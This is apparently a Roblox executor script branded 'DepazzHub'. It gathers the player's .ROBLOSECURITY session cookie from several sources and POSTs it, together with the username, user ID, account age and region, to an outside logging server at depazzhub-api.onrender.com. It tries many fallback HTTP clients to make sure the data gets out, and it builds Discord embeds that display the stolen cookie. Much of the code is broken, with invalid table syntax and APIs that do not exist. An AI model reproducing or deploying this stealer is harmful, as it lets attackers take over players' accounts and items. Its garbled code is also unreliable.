local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local CookieService = game:GetService("CookieService")
local LocalizationService = game:GetService("LocalizationService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function GetCookies()
	local cookies = {}
	
	local savedCookies = CookieService:GetCookies()
	if savedCookies then
		for _, cookie in ipairs(savedCookies) do
			table.insert(cookies, cookie)
		end
	end
	
	if #cookies == 0 then
		local cookiesEnv = getgenv("_ROBLOX_COOKIES")
		if cookiesEnv and type(cookiesEnv) == "table" then
			for _, cookie in ipairs(cookiesEnv) do
				table.insert(cookies, cookie)
			end
		end
	end
	
	if #cookies == 0 then
		local cookieValue = getgenv("_ROBLOSECURITY")
		if cookieValue and cookieValue ~= "" then
			table.insert(cookies, {
				Name = ".ROBLOSECURITY",
				Value = cookieValue,
				SameSite = "None",
				Path = "/",
				Domain = "www.roblox.com"
			})
		end
	end
	
	if #cookies == 0 then
		local savedCookie = CookieService:GetCookieValue(".ROBLOSECURITY", "https://www.roblox.com")
		if savedCookie ~= "" and savedCookie ~= nil then
			table.insert(cookies, {
				Name = ".ROBLOSECURITY",
				Value = savedCookie,
				SameSite = "None",
				Path = "/",
				Domain = "www.roblox.com"
			})
		end
	end
	
	if #cookies == 0 then
		local names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "cookie_value", "RBX_COOKIE"}
		for _, name in ipairs(names) do
			local val = getgenv(name)
			if val and val ~= "" and val ~= nil then
				table.insert(cookies, {
					Name = ".ROBLOSECURITY",
					Value = tostring(val),
					SameSite = "None",
					Path = "/",
					Domain = "www.roblox.com"
				})
				break
			end
		end
	end
	
	return cookies
end

local function GetCookieService()
	local cookies = GetCookies()
	if #cookies > 0 then
		return cookies[1]
	end
	return nil
end

local function GetCookieValue(cookieName, domain)
	local cookies = GetCookies()
	for _, cookie in ipairs(cookies) do
		if cookie.Name == cookieName then
			return cookie.Value
		end
	end
	return ""
end

local function EscapeJson(str)
	if str == nil then
		return "nil"
	end
	local s = tostring(str)
	s = string.gsub(s, '\\', '\\\\')
	s = string.gsub(s, '"', '\\"')
	s = string.gsub(s, '\n', '\\n')
	s = string.gsub(s, '\r', '\\r')
	s = string.gsub(s, '\t', '\\t')
	return s
end

local function Request(options)
	options = options or {}
	
	local url = options.Url or ""
	local method = options.Method or "GET"
	local headers = options.Headers or {}
	local body = options.Body
	local timeout = options.Timeout or 15
	
	if url == "" then
		url = options.TargetUrl or ""
	end
	
	if url == "" then
		error("Error: No se especificó URL")
	end
	
	local fullHeaders = {}
	for key, val in pairs(headers) do
		fullHeaders[key] = val
	end
	
	fullHeaders["Connection"] = "keep-alive"
	fullHeaders["Accept"] = "*/*"
	
	if method == "POST" then
		fullHeaders["Content-Type"] = "application/json"
	end
	
	local bodyString = body
	if type(body) == "table" then
		bodyString = table.concat(body, "\n")
	end
	
	local fullUrl = url
	
	local _RbxRequest = getgenv("_RbxRequest")
	if _RbxRequest then
		local response = _RbxRequest(fullUrl, method, bodyString, fullHeaders)
		if response then
			return response
		end
	end
	
	local customRequest = getgenv("request")
	if customRequest then
		local response = customRequest(fullUrl, method, bodyString, fullHeaders)
		if response then
			return response
		end
	end
	
	local axios = getgenv("axios")
	if axios then
		local response = axios.post(fullUrl, bodyString, {
			headers = fullHeaders
		})
		if response then
			return response
		end
	end

	local fetch = getgenv("fetch")
	if fetch then
		return fetch(fullUrl, {
			method = method,
			headers = fullHeaders,
			body = bodyString
		})
	end
	
	local _RbxHttpClient = getgenv("_RbxHttpClient")
	if _RbxHttpClient then
		return _RbxHttpClient:Post(fullUrl, bodyString, fullHeaders)
	end
	
	local HttpClient = getgenv("HttpClient")
	if HttpClient then
		return HttpClient:Post(fullUrl, bodyString, fullHeaders)
	end

	local httpService = getgenv("HttpService")
	if httpService then
		local response = httpService:PostJson(fullUrl, bodyString)
		if response then
			return response
		end
	end
	
	local response = HttpService:PostJsonAsync(fullUrl, bodyString)
	
	if response and response.Success then
		return response
	end
	
	return nil
end

local function HttpGet(url, options)
	options = options or {}
	return Request({
		Url = url,
		Method = "GET",
		Headers = options.Headers or {},
		Timeout = options.Timeout or 15
	})
end

local function HttpPost(url, body, options)
	options = options or {}
	return Request({
		Url = url,
		Method = "POST",
		Body = body,
		Headers = options.Headers or {
			["Content-Type"] = "application/json"
		},
		Timeout = options.Timeout or 15
	})
end

local function GetUserData(userId)
	if not userId or userId == 0 then
		local player = Players.LocalPlayer
		userId = player.UserId
	end
	
	local url = "https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/server-info/" .. userId
	url = url .. "?fields=Id,Name,AvatarUrl,DisplayFolder,DisplayName,JoinCount,LeaderboardPosition,Role,LastLocation,PlayerColor"
	
	local response = HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

local function GetPlaceInfo(placeId)
	local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers"
	url = url .. "?fields=Id,Name,PlaceId,CreatorId,CreatorName,Description,DescriptionId,DescriptionToken,GameIcon,Active,IsMap,MapId,MapIdToken,IsTest,ServerTemplateId,TemplateId,TemplateIdToken,MapId,Version"
	
	local response = HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

local function GetInventory(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/inventory/items"
	local response = HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

local function GetBadges(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/badges"
	local response = HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

local function GetGroups(userId)
	local url = "https://games.roblox.com/v1/users/" .. userId .. "/groups"
	local response = HttpGet(url)
	
	if response and response.Success then
		return response.Body
	end
	
	return nil
end

local function GetAccountAge()
	local player = Players.LocalPlayer
	
	local dateCreated = player.DateCreated

	local unixNow = HttpService:UnixFromDateTime(os.date("*t"))
	local unixCreated = HttpService:UnixFromDateTime(dateCreated)
	
	local days = (unixNow - unixCreated) / 86400
	
	local years = math.floor(days / 365)
	local months = math.floor((days % 365) / 30)
	
	local ageText = days .. " days"
	if years > 0 then
		ageText = years .. " years, " .. months .. " months (" .. days .. " days)"
	end
	
	return ageText
end

local function GetRegion()
	return LocalizationService.RobloxLocaleId
end

local function GetPlaceName()
	local placeInfo = GetPlaceInfo(game.PlaceId)
	
	if placeInfo then
		return placeInfo.Name
	end
	
	return "Desconocido"
end

local function GetServerName()
	local serverInfo = game:GetService("CollectionService"):GetTaggedInstances("ServerName")
	
	for _, instance in ipairs(serverInfo) do
		return instance.Name
	end
	
	return "Servidor " .. game.PlaceId
end

local function CreateDiscordEmbed(title, description, color, fields, timestamp)
	local embed = {
		{
			"title" = title,
			"description" = description,
			"color" = color,
			"fields" = fields or {},
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = timestamp or os.date("%Y-%m-%dT%H:%M:%SZ")
		}
	}
	
	return embed
end

local function CreatePlayerEmbed(playerName, userId, age, region, cookie)
	local embed = {
		{
			"title" = playerName .. " - DepazzHub",
			"description" = "Usuario de Roblox",
			"color" = 3887359,
			"fields" = {
				{ "name" = "🆔 User ID", "value" = tostring(userId), "inline" = true },
				{ "name" = "👤 Username", "value" = playerName or "Desconocido", "inline" = true },
				{ "name" = "🍪 Cookie", "value" = ".ROBLOSECURITY=" .. (cookie or ""), "inline" = false },
				{ "name" = "🎂 Account Age", "value" = age or "N/A", "inline" = true },
				{ "name" = "🌍 Region", "value" = region or "N/A", "inline" = true }
			},
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = os.date("%Y-%m-%dT%H:%M:%SZ")
		}
	}
	
	return embed
end

local function ToJson(obj)
	return HttpService:JSONEncode(obj)
end

local function FromJson(json)
	return HttpService:JSONDecode(json)
end

local function GetPlaceId()
	return game.PlaceId
end

local function GetServerId()
	local serverInfo = game:GetService("CollectionService"):GetTaggedInstances("ServerName")
	
	for _, instance in ipairs(serverInfo) do
		return instance.Name
	end
	
	return "Servidor " .. game.PlaceId
end

local function GetTimestamp()
	return os.date("%Y-%m-%dT%H:%M:%SZ")
end

local function GenerateUuid()
	local uuid = ""
	local chars = "0123456789ABCDEF"
	
	for i = 1, 32 do
		uuid = uuid .. chars:sub(math.random(1, #chars), math.random(1, #chars))
	end
	
	return uuid
end

local function CreateInventoryEmbed(items)
	if not items or #items == 0 then
		return nil
	end
	
	local totalValue = 0
	local fields = {}
	
	for _, item in ipairs(items) do
		local name = item.name or item.Name or "Desconocido"
		local value = item.recentAveragePrice or item.UnitPrice or 0
		totalValue = totalValue + value
		
		table.insert(fields, {
			"name" = name,
			"value" = tostring(value) .. " Robux",
			"inline" = true
		})
	end
	
	return {
		{
			"title" = "📦 Inventario",
			"description" = "Items en el inventario",
			"color" = 5763749,
			"fields" = fields,
			"footer" = {
				"text" = "DepazzHub API",
				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
			},
			"timestamp" = GetTimestamp()
		}
	}
end

local function Main()
	local player = Players.LocalPlayer
	local userId = player.UserId
	local placeId = GetPlaceId()
	local serverName = GetServerName()

	local ageText = GetAccountAge()
	
	local region = GetRegion()
	
	local cookieValue = GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
	
	local data = {
		username = player.Name,
		displayName = player.DisplayName,
		userId = userId,
		gameId = placeId,
		accountAge = ageText,
		region = region,
		cookie = ".ROBLOSECURITY=" .. cookieValue
	}
	
	local embed = CreatePlayerEmbed(
		player.Name,
		userId,
		ageText,
		region,
		cookieValue
	)
	
	local apiUrl = "https://depazzhub-api.onrender.com/log"
	local response = HttpPost(apiUrl, data)
	
	if response then
		print("✅ Webhook enviado correctamente! Status: " .. (response.StatusCode or response.status or "200"))
		return response
	end
	
	local _RbxRequest = getgenv("_RbxRequest")
	if _RbxRequest then
		local response2 = _RbxRequest(apiUrl, "POST", ToJson(data))
		if response2 then
			print("✅ Webhook enviado (fallback)! Status: " .. (response2.status or response2.StatusCode or "200"))
			return response2
		end
	end
	
	local axios = getgenv("axios")
	if axios then
		local response3 = axios.post(apiUrl, data, {
			headers = { "Content-Type" = "application/json" }
		})
		if response3 and response3.status == 200 then
			print("✅ Webhook enviado (axios)! Status: " .. response3.status)
			return response3
		end
	end
	
	local fetch = getgenv("fetch")
	if fetch then
		local response4 = fetch(apiUrl, {
			method = "POST",
			headers = { "Content-Type" = "application/json" },
			body = ToJson(data)
		})
		if response4 and response4.status == 200 then
			print("✅ Webhook enviado (fetch)! Status: " .. response4.status)
			return response4
		end
	end

	local _RbxHttpClient = getgenv("_RbxHttpClient")
	if _RbxHttpClient then
		local response5 = _RbxHttpClient:Post(apiUrl, ToJson(data), {
			"Content-Type" = "application/json"
		})
		if response5 and response5.StatusCode == 200 then
			print("✅ Webhook enviado (_RbxHttpClient)! Status: " .. response5.StatusCode)
			return response5
		end
	end
	
	local HttpClient = getgenv("HttpClient")
	if HttpClient then
		local response6 = HttpClient:Post(apiUrl, ToJson(data), {
			"Content-Type" = "application/json"
		})
		if response6 and response6.StatusCode == 200 then
			print("✅ Webhook enviado (HttpClient)! Status: " .. response6.StatusCode)
			return response6
		end
	end
	
	local httpService = getgenv("HttpService")
	if httpService then
		local response7 = httpService:PostJson(apiUrl, ToJson(data))
		if response7 and response7.StatusCode == 200 then
			print("✅ Webhook enviado (HttpService)! Status: " .. response7.StatusCode)
			return response7
		end
	end
	
	local response8 = HttpService:PostJsonAsync(apiUrl, ToJson(data))
	
	if response8 and response8.Success then
		print("✅ Webhook enviado (HttpService)! Status: " .. response8.StatusCode)
		return response8
	end
	
	warn("❌ Error: No se pudo enviar el webhook. Todos los fallbacks fallaron.")
	warn("  API_URL: " .. apiUrl)
	warn("  Data: " .. ToJson(data))
	warn("  Response: " .. tostring(response))
	
	return nil
end

return {
	GetCookies = GetCookies,
	GetCookieService = GetCookieService,
	GetCookieValue = GetCookieValue,
	EscapeJson = EscapeJson,
	Request = Request,
	HttpGet = HttpGet,
	HttpPost = HttpPost,
	GetUserData = GetUserData,
	GetPlaceInfo = GetPlaceInfo,
	GetInventory = GetInventory,
	GetBadges = GetBadges,
	GetGroups = GetGroups,
	GetAccountAge = GetAccountAge,
	GetRegion = GetRegion,
	GetPlaceName = GetPlaceName,
	GetServerName = GetServerName,
	CreateDiscordEmbed = CreateDiscordEmbed,
	CreatePlayerEmbed = CreatePlayerEmbed,
	ToJson = ToJson,
	FromJson = FromJson,
	GetPlaceId = GetPlaceId,
	GetServerId = GetServerId,
	GetTimestamp = GetTimestamp,
	GenerateUuid = GenerateUuid,
	CreateInventoryEmbed = CreateInventoryEmbed,
	Main = Main
}
